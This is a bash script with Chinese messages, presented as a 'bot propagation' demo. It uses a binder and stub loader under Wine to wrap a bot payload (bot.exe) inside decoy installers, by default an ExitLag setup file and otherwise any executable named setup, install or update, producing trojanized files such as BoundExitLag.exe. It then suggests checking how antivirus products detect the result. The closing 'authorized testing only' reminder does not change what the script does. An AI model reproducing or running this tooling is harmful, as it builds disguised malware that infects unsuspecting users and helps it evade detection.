#!/bin/bash

# Bot传播机制演示脚本
# 展示如何使用传播组件进行文件绑定和兼容性测试

echo "=========================================="
echo "    Bot传播机制演示 v1.0"
echo "    Windows 8-11兼容文件绑定系统"
echo "=========================================="
echo

# 检查必要文件
echo "1. 检查必要组件..."
REQUIRED_FILES=(
    "build/prop/stubloader.exe"
    "build/prop/binder.exe" 
    "build/prop/libpropagation.a"
    "bot/bot.exe"
)

for file in "${REQUIRED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "  ? $file"
    else
        echo "  ? $file (缺失)"
        echo "请先运行 ./build_propagation.sh 编译组件"
        exit 1
    fi
done

echo
echo "2. 组件信息:"
echo "  Stubloader: $(stat -c%s build/prop/stubloader.exe) bytes"
echo "  Binder: $(stat -c%s build/prop/binder.exe) bytes"
echo "  Bot: $(stat -c%s bot/bot.exe) bytes"
echo "  传播库: $(stat -c%s build/prop/libpropagation.a) bytes"

echo
echo "3. 可用的诱饵文件:"
DECOY_FILES=()
if [ -f "SetupExitLag-5.15.2-x64.exe" ]; then
    DECOY_FILES+=("SetupExitLag-5.15.2-x64.exe")
    echo "  ? SetupExitLag-5.15.2-x64.exe ($(stat -c%s SetupExitLag-5.15.2-x64.exe) bytes)"
fi

# 检查其他常见文件
for file in *.exe; do
    if [ -f "$file" ] && [ "$file" != "BoundExitLag.exe" ]; then
        case "$file" in
            *setup*|*install*|*update*)
                DECOY_FILES+=("$file")
                echo "  ? $file ($(stat -c%s "$file") bytes)"
                ;;
        esac
    fi
done

if [ ${#DECOY_FILES[@]} -eq 0 ]; then
    echo "  ? 未找到合适的诱饵文件"
    echo "    请将要绑定的.exe文件放在当前目录"
    exit 1
fi

echo
echo "4. 选择绑定操作:"
echo "  [1] 绑定ExitLag安装程序 (推荐)"
echo "  [2] 选择其他诱饵文件"
echo "  [3] 仅显示现有绑定文件信息"
echo "  [4] 运行兼容性分析"
echo "  [q] 退出"
echo

read -p "请选择操作 [1-4,q]: " choice

case $choice in
    1)
        if [ -f "SetupExitLag-5.15.2-x64.exe" ]; then
            DECOY_FILE="SetupExitLag-5.15.2-x64.exe"
            OUTPUT_FILE="BoundExitLag.exe"
        else
            echo "错误: SetupExitLag-5.15.2-x64.exe 文件不存在"
            exit 1
        fi
        ;;
    2)
        echo "可用的诱饵文件:"
        for i in "${!DECOY_FILES[@]}"; do
            echo "  [$((i+1))] ${DECOY_FILES[$i]}"
        done
        read -p "请选择文件编号: " file_num
        if [ "$file_num" -ge 1 ] && [ "$file_num" -le "${#DECOY_FILES[@]}" ]; then
            DECOY_FILE="${DECOY_FILES[$((file_num-1))]}"
            OUTPUT_FILE="Bound_$(basename "$DECOY_FILE")"
        else
            echo "无效选择"
            exit 1
        fi
        ;;
    3)
        echo
        echo "现有绑定文件:"
        for file in Bound*.exe; do
            if [ -f "$file" ]; then
                echo "  ? $file ($(stat -c%s "$file") bytes)"
                echo "    创建时间: $(stat -c%y "$file")"
            fi
        done
        exit 0
        ;;
    4)
        echo
        echo "运行兼容性分析..."
        if [ -f "BoundExitLag.exe" ]; then
            ./analyze_exe_compatibility.sh BoundExitLag.exe
        else
            echo "未找到BoundExitLag.exe，请先进行绑定操作"
        fi
        exit 0
        ;;
    q)
        echo "退出演示"
        exit 0
        ;;
    *)
        echo "无效选择"
        exit 1
        ;;
esac

echo
echo "=========================================="
echo "开始文件绑定操作"
echo "=========================================="
echo "  诱饵文件: $DECOY_FILE"
echo "  输出文件: $OUTPUT_FILE"
echo "  Bot载荷: bot/bot.exe"
echo "  Stubloader: build/prop/stubloader.exe"
echo

# 检查Wine是否可用
if ! command -v wine &> /dev/null; then
    echo "错误: 需要安装Wine来运行Windows可执行文件"
    echo "请运行: sudo apt install wine"
    exit 1
fi

echo "5. 执行绑定操作..."
echo "命令: wine ./build/prop/binder.exe ./build/prop/stubloader.exe ./bot/bot.exe ./$DECOY_FILE ./$OUTPUT_FILE"
echo

# 执行绑定
wine ./build/prop/binder.exe ./build/prop/stubloader.exe ./bot/bot.exe "./$DECOY_FILE" "./$OUTPUT_FILE"

if [ $? -eq 0 ] && [ -f "$OUTPUT_FILE" ]; then
    echo
    echo "=========================================="
    echo "绑定操作完成!"
    echo "=========================================="
    echo
    echo "6. 绑定结果:"
    echo "  输出文件: $OUTPUT_FILE"
    echo "  文件大小: $(stat -c%s "$OUTPUT_FILE") bytes"
    echo "  创建时间: $(stat -c%y "$OUTPUT_FILE")"
    
    # 计算开销
    STUB_SIZE=$(stat -c%s build/prop/stubloader.exe)
    BOT_SIZE=$(stat -c%s bot/bot.exe)
    DECOY_SIZE=$(stat -c%s "$DECOY_FILE")
    OUTPUT_SIZE=$(stat -c%s "$OUTPUT_FILE")
    OVERHEAD=$((OUTPUT_SIZE - DECOY_SIZE))
    OVERHEAD_PERCENT=$(echo "scale=4; $OVERHEAD * 100 / $DECOY_SIZE" | bc -l)
    
    echo
    echo "7. 大小分析:"
    echo "  Stubloader: $STUB_SIZE bytes"
    echo "  Bot载荷: $BOT_SIZE bytes"
    echo "  诱饵文件: $DECOY_SIZE bytes"
    echo "  绑定文件: $OUTPUT_SIZE bytes"
    echo "  额外开销: $OVERHEAD bytes ($OVERHEAD_PERCENT%)"
    
    echo
    echo "8. 后续操作建议:"
    echo "  [1] 运行兼容性分析: ./analyze_exe_compatibility.sh $OUTPUT_FILE"
    echo "  [2] 查看分析结果: cat /home/kali/vms/analysis_results/compatibility_summary.txt"
    echo "  [3] 在Windows虚拟机中测试绑定文件"
    echo "  [4] 检查杀毒软件检测情况"
    
    echo
    echo "9. 安全提醒:"
    echo "  ? 此工具仅用于授权的安全测试"
    echo "  ? 请在隔离环境中测试"
    echo "  ? 遵守相关法律法规"
    
    echo
    read -p "是否立即运行兼容性分析? [y/N]: " run_analysis
    if [[ $run_analysis =~ ^[Yy]$ ]]; then
        echo
        echo "运行兼容性分析..."
        ./analyze_exe_compatibility.sh "$OUTPUT_FILE"
        echo
        echo "分析完成! 查看详细结果:"
        echo "  cat /home/kali/vms/analysis_results/compatibility_summary.txt"
    fi
    
else
    echo
    echo "=========================================="
    echo "绑定操作失败!"
    echo "=========================================="
    echo
    echo "可能的原因:"
    echo "  1. Wine配置问题"
    echo "  2. 文件权限问题"
    echo "  3. 磁盘空间不足"
    echo "  4. 输入文件损坏"
    echo
    echo "请检查错误信息并重试"
    exit 1
fi

echo
echo "=========================================="
echo "演示完成!"
echo "=========================================="
